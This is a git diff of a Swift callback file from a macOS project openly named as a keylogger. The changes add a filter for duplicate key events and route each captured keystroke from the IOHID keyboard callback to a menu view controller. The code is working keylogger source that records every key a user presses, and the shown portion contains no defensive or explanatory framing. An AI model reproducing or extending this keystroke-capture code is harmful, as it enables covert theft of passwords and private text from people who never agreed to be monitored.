@@ -1,5 +1,5 @@
 //
-//  CallBackFunctions.swift
+//  KeyCallback.swift
 //  Noonecares x Keylogger
 //
 //  Created by Skrew Everything on 14/01/17.
@@ -10,9 +10,12 @@
 import Foundation
 import Cocoa
 
+var lastChar = "" // For some reason, every event I get gets triggered twice. I made this lazy and silly thing to avoid this.
+
 class CallBackFunctions
 {     
     static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
+        print("B")
         let myself = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let elem: IOHIDElement = IOHIDValueGetElement(device);
         if (IOHIDElementGetUsagePage(elem) != 0x07)
@@ -27,7 +30,14 @@ class CallBackFunctions
         let pressed = IOHIDValueGetIntegerValue(device);
         if pressed == 1
         {
-            print(myself.keyMap[scancode]![0])
+            if let key = myself.keyMap[scancode]?[0] {
+                if key != lastChar {
+                    lastChar = key
+                    MenuViewController.registerKeyloggerEvent(key)
+                } else {
+                    lastChar = ""
+                }
+            }
         }
     }
 }
